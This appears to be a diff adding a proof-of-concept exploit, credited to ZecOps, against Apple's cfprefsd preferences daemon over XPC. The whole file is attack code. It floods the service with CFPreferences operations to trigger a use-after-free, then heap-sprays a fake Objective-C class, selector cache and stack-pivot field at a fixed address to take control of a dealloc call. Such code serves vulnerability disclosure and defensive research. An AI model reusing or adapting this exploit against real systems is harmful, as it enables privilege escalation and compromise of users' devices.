@@ -1,0 +1,165 @@
+// (c) 2019 ZecOps, Inc. - https://www.zecops.com - Find Attackers' Mistakes
+// Intended only for educational and defensive purposes only. 
+// Use at your own risk.
+ 
+#include <xpc/xpc.h>
+#import <pthread.h>
+#include <mach/mach.h>
+#include <mach/task.h>
+#include <dlfcn.h>
+#include <mach-o/dyld_images.h>
+#include <objc/runtime.h>
+ 
+#define AGENT 1
+ 
+#define FILL_DICT_COUNT 0x600
+#define FILL_COUNT 0x1000
+#define FREE_COUNT 0x2000
+#define FILL_SIZE (0xc0)
+ 
+int need_stop = 0;
+ 
+struct heap_spray {
+    void* fake_objc_class_ptr;
+    uint32_t r10;
+    uint32_t r4;
+    void* fake_sel_addr;
+    uint32_t r5;
+    uint32_t r6;
+    uint64_t cmd;
+    uint8_t pad1[0x3c];
+    uint32_t stack_pivot;
+    struct fake_objc_class_t {
+        char pad[0x8];
+        void* cache_buckets_ptr;
+        uint32_t cache_bucket_mask;
+    } fake_objc_class;
+    struct fake_cache_bucket_t {
+        void* cached_sel;
+        void* cached_function;
+    } fake_cache_bucket;
+    char command[32];
+};
+ 
+void fill_once(){
+     
+#if AGENT
+    xpc_connection_t client = xpc_connection_create_mach_service("com.apple.cfprefsd.agent",0,0);
+#else
+    xpc_connection_t client = xpc_connection_create_mach_service("com.apple.cfprefsd.daemon",0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+#endif
+     
+    xpc_connection_set_event_handler(client, ^void(xpc_object_t response) {
+        xpc_type_t t = xpc_get_type(response);
+        if (t == XPC_TYPE_ERROR){
+            printf("err: %s\n", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));
+            need_stop = 1 ;
+        }
+        //printf("received an event\n");
+    });
+     
+    xpc_connection_resume(client);
+    xpc_object_t main_dict = xpc_dictionary_create(NULL, NULL, 0);
+     
+    xpc_object_t arr = xpc_array_create(NULL, 0);
+     
+    xpc_object_t spray_dict = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_int64(spray_dict, "CFPreferencesOperation", 8);
+    xpc_dictionary_set_string(spray_dict, "CFPreferencesDomain", "xpc_str_domain");
+    xpc_dictionary_set_string(spray_dict, "CFPreferencesUser", "xpc_str_user");
+     
+    char key[100];
+    char value[FILL_SIZE];
+    memset(value, "A", FILL_SIZE);
+    *((uint64_t *)value) = 0x4142010180202020;
+    //*((uint64_t *)value) = 0x180202020;
+    value[FILL_SIZE-1]=0;
+    for (int i=0; i<FILL_DICT_COUNT; i++) {
+        sprintf(key, "%d",i);
+        xpc_dictionary_set_string(spray_dict, key, value);
+    }
+      
+    //NSLog(@"%@", spray_dict);
+    for (uint64_t i=0; i<FILL_COUNT; i++) {
+        xpc_array_append_value(arr, spray_dict);
+    }
+     
+    xpc_dictionary_set_int64(main_dict, "CFPreferencesOperation", 5);
+     
+    xpc_dictionary_set_value(main_dict, "CFPreferencesMessages", arr);
+ 
+    void* heap_spray_target_addr = (void*)0x180202000;
+    struct heap_spray* map = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
+    memset(map, 0, 0x1000);
+    struct heap_spray* hs = (struct heap_spray*)((uint64_t)map + 0x20);
+    //hs->null0 = 0;
+    hs->cmd = -1;
+    hs->fake_objc_class_ptr = &hs->fake_objc_class;
+    hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;
+    hs->fake_objc_class.cache_bucket_mask = 0;
+    hs->fake_sel_addr = &hs->fake_cache_bucket.cached_sel;
+    // nasty hack to find the correct selector address
+    hs->fake_cache_bucket.cached_sel = 0x7fff00000000 + (uint64_t)NSSelectorFromString(@"dealloc");
+     
+    hs->fake_cache_bucket.cached_function = 0xdeadbeef;
+    size_t heap_spray_pages = 0x40000;
+    size_t heap_spray_bytes = heap_spray_pages * 0x1000;
+    char* heap_spray_copies = malloc(heap_spray_bytes);
+    for (int i = 0; i < heap_spray_pages; i++){
+    memcpy(heap_spray_copies+(i*0x1000), map, 0x1000);
+    }
+    xpc_dictionary_set_data(main_dict, "heap_spray", heap_spray_copies, heap_spray_bytes);
+ 
+    //NSLog(@"%@", main_dict);
+    xpc_connection_send_message(client, main_dict);
+    printf("fill once\n");
+    xpc_release(main_dict);
+}
+ 
+void trigger_vul(){
+    #if AGENT
+        printf("AGENT\n");
+        xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.cfprefsd.agent",0,0);
+    #else
+        printf("DAEMON\n");
+        xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.cfprefsd.daemon",0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+    #endif
+        xpc_connection_set_event_handler(conn, ^(xpc_object_t response) {
+            xpc_type_t t = xpc_get_type(response);
+            if (t == XPC_TYPE_ERROR){
+                printf("err: %s\n", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));
+                need_stop = 1 ;
+            }
+        });
+        xpc_connection_resume(conn);
+         
+        xpc_object_t hello = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_object_t arr = xpc_array_create(NULL, 0);
+     
+        xpc_object_t arr_free = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_int64(arr_free, "CFPreferencesOperation", 4);
+        xpc_array_append_value(arr, arr_free);
+        for (int i=0; i<FREE_COUNT; i++) {
+            xpc_object_t arr_elem1 = xpc_dictionary_create(NULL, NULL, 0);
+            xpc_dictionary_set_int64(arr_elem1, "CFPreferencesOperation", 20);
+            xpc_array_append_value(arr, arr_elem1);
+        }
+        //printf("%p, %p\n", arr_elem1, hello);
+        xpc_dictionary_set_int64(hello, "CFPreferencesOperation", 5);
+        xpc_dictionary_set_value(hello, "CFPreferencesMessages", arr);
+ 
+        //NSLog (@"%@", hello);
+        fill_once();
+        xpc_connection_send_message(conn, hello);
+        NSLog(@" trigger vuln");
+        xpc_release(hello);
+}
+ 
+int main(int argc, const char * argv[]) {
+ 
+    pthread_t fillthread1,triger_thread;
+    NSLog(@"start to trigger..");
+    trigger_vul();
+ 
+    return 0;
+}
